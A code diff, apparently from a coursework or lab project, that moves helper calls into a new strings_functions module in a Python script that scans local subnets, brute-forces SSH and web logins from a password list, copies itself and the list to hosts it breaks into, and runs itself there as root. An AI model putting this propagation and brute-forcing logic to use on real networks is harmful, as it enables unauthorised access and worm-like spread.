@@ -23,6 +23,8 @@ import pipes
 import requests
 # Importing strings for use of the external strings resources.
 import strings
+# Importing strings_functions for string building functions.
+import strings_functions
 
 
 def additional_actions(arguments, ip, port, username,
@@ -118,8 +120,9 @@ def check_over_ssh(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         # Hardcoded checks to avoid injection
-        if strings.touch_file(strings.DEMO_SCRIPT_FILENAME) == "touch demo.py":
-            client.exec_command(pipes.quote(strings.
+        if strings_functions.touch_file(strings.DEMO_SCRIPT_FILENAME) == \
+                "touch demo.py":
+            client.exec_command(pipes.quote(strings_functions.
                                             touch_file(strings.
                                                        DEMO_SCRIPT_FILENAME)))
         else:
@@ -127,8 +130,9 @@ def check_over_ssh(ip, port, username, password):
             client.close()
             return False
         # Hardcoded checks to avoid injection
-        if strings.cat_file(strings.DEMO_SCRIPT_FILENAME) == "cat demo.py":
-            if str(client.exec_command(pipes.quote(strings.cat_file(
+        if strings_functions.cat_file(strings.DEMO_SCRIPT_FILENAME) == \
+                "cat demo.py":
+            if str(client.exec_command(pipes.quote(strings_functions.cat_file(
                     strings.DEMO_SCRIPT_FILENAME)))[1]).__len__() < 1:
                 client.close()
                 return True
@@ -204,14 +208,16 @@ def connect_ssh_client(ip, port, username, password):
         client.connect(hostname=str(ip), port=int(port),
                        username=str(username), password=str(password))
         client.close()
-        logging.info(strings.connection_status(strings.SSH, ip, port,
-                                               strings.SUCCESSFUL))
+        logging.info(strings_functions.connection_status(strings.SSH, ip, port,
+                                                         strings.SUCCESSFUL))
         return True
 
     except SSHException:
         client.close()
-        logging.debug(strings.connection_status(strings.SSH, ip, port,
-                                                strings.UNSUCCESSFUL))
+        logging.debug(strings_functions.connection_status(strings.SSH, ip,
+                                                          port,
+                                                          strings.UNSUCCESSFUL)
+                      )
         return False
 
 
@@ -231,11 +237,13 @@ def connect_web(ip, port, username, password):
         send_post_request_with_login(ip, port, username, password)
         attempt_succeeded = True
     except RuntimeError:
-        logging.debug(strings.connection_status(strings.WEB, ip, port,
-                                                strings.UNSUCCESSFUL))
+        logging.debug(strings_functions.connection_status(strings.WEB, ip,
+                                                          port,
+                                                          strings.UNSUCCESSFUL)
+                      )
     if attempt_succeeded:
-        logging.info(strings.connection_status(strings.WEB, ip, port,
-                                               strings.SUCCESSFUL))
+        logging.info(strings_functions.connection_status(strings.WEB, ip, port,
+                                                         strings.SUCCESSFUL))
     return attempt_succeeded
 
 
@@ -273,8 +281,9 @@ def cycle_through_subnet(ip_list, interface):
                            + str(interface_split[2]) + strings.FULL_STOP \
                            + str(last_byte)
         if not ip_list.__contains__(specific_address):
-            logging.info(strings.adding_address_to_interface(specific_address,
-                                                             interface))
+            logging.info(strings_functions.adding_address_to_interface(
+                specific_address,
+                interface))
             if ip_list is not strings.SPACE:
                 ip_list.append(specific_address)
             else:
@@ -317,7 +326,8 @@ def gathering_local_ips(ip_list):
     #     local_interfaces = local_interfaces.remove(strings.LOOPBACK)
     for interface in local_interfaces:
         if str(interface) != strings.LOOPBACK:
-            logging.info(strings.fetching_ips_for_interface(interface))
+            logging.info(strings_functions.fetching_ips_for_interface(
+                interface))
             ip_list = (cycle_through_subnet(ip_list, interface))
     return ip_list
 
@@ -326,7 +336,7 @@ def exit_and_show_instructions():
     """
     This function will print the help screen and show an exit prompt.
     """
-    print(strings.help_output())
+    print(strings_functions.help_output())
     print(strings.EXITING)
 
 
@@ -349,9 +359,9 @@ def is_reachable_ip(ip):
     # return True
     command = [strings.PING, strings.PING_ARGUMENT, strings.ONE, str(ip)]
     if subprocess.call(command) == 0:
-        logging.info(strings.ip_reachability(ip, True))
+        logging.info(strings_functions.ip_reachability(ip, True))
         return True
-    logging.debug(strings.ip_reachability(ip, False))
+    logging.debug(strings_functions.ip_reachability(ip, False))
     return False
 
 
@@ -375,28 +385,32 @@ def propagate_script(ip, port, login_string):
         if file_not_exist(ip, port, login_string_split[0],
                           login_string_split[1]):
             print(strings.RSA_AND_PROMPT)
-            os.system(strings.scp_command_string(port,
-                                                 login_string_split[0],
-                                                 ip,
-                                                 os.path
-                                                 .basename(__file__)))
+            os.system(strings_functions.scp_command_string(port,
+                                                           login_string_split[
+                                                               0],
+                                                           ip,
+                                                           os.path
+                                                           .basename(__file__))
+                      )
             print(strings.RSA_PROMPT_AGAIN)
-            os.system(strings.scp_command_string(port,
-                                                 login_string_split[0],
-                                                 ip,
-                                                 strings.PWDS_LIST))
+            os.system(strings_functions.scp_command_string(port,
+                                                           login_string_split[
+                                                               0],
+                                                           ip,
+                                                           strings.PWDS_LIST))
             client = SSHClient()
             try:
                 client.set_missing_host_key_policy(RejectPolicy)
                 client.connect(hostname=str(ip), port=int(port),
                                username=str(login_string_split[0]),
                                password=str(login_string_split[1]))
-                if strings.run_script_command() == "./demo.py -L -p 22 -u " \
-                                                   "root -f " \
-                                                   "src/test_files/" \
-                                                   "passwords_list.txt -P":
+                if strings_functions.run_script_command() == \
+                        "./demo.py -L -p 22 -u " \
+                        "root -f " \
+                        "src/test_files/" \
+                        "passwords_list.txt -P":
                     client.exec_command(pipes.quote(
-                        strings.run_script_command()))
+                        strings_functions.run_script_command()))
                 else:
                     logging.error(strings.SANITATION_FAILED)
                     client.close()
@@ -407,7 +421,7 @@ def propagate_script(ip, port, login_string):
                 client.close()
                 return False
         else:
-            logging.debug(strings.file_present_on_host(ip))
+            logging.debug(strings_functions.file_present_on_host(ip))
             return False
     except RuntimeError:
         return False
@@ -423,7 +437,7 @@ def remove_unreachable_ips(ip_list):
     """
     new_ip_list = []
     for ip in ip_list:
-        logging.info(strings.checking_ip_reachable(ip))
+        logging.info(strings_functions.checking_ip_reachable(ip))
         if is_reachable_ip(ip):
             new_ip_list.append(ip)
     return new_ip_list
@@ -459,16 +473,16 @@ def send_post_request_with_login(ip, port, username, password):
     :param username: The username for the web login
     :param password: The password for the web login
     """
-    response = requests.post(strings.web_login_url(ip, port),
+    response = requests.post(strings_functions.web_login_url(ip, port),
                              data={strings.USERNAME_PROMPT_WEB: username,
                                    strings.PASSWORD_PROMPT_WEB: password},
                              timeout=4)
     if response:
-        logging.info(strings.connection_status(strings.WEB, ip, port,
-                                               strings.SUCCESSFUL))
+        logging.info(strings_functions.connection_status(strings.WEB, ip, port,
+                                                         strings.SUCCESSFUL))
         return str(username) + strings.COLON + str(password)
-    logging.debug(strings.connection_status(strings.WEB, ip, port,
-                                            strings.UNSUCCESSFUL))
+    logging.debug(strings_functions.connection_status(strings.WEB, ip, port,
+                                                      strings.UNSUCCESSFUL))
     return None
 
 
@@ -510,8 +524,10 @@ def transfer_file(ip, port, login_string, transfer_file_filename):
     login_string_split = login_string.split(strings.COLON)
     try:
         print(strings.RSA_AND_PROMPT)
-        os.system(strings.scp_command_string(port, login_string_split[0],
-                                             ip, transfer_file_filename))
+        os.system(strings_functions.scp_command_string(port,
+                                                       login_string_split[0],
+                                                       ip,
+                                                       transfer_file_filename))
         return True
     except ConnectionRefusedError:
         return False
@@ -569,7 +585,7 @@ def try_sign_in(ip, port, target_username, password_list):
     service = service_switch.get(str(port))
     sign_in_details = sign_in_service(ip, port, target_username, password_list)
     if sign_in_details:
-        logging.info(strings.working_username_password(service))
+        logging.info(strings_functions.working_username_password(service))
         return str(sign_in_details), service
     logging.debug(strings.IMPOSSIBLE_ACTION)
     return None, service
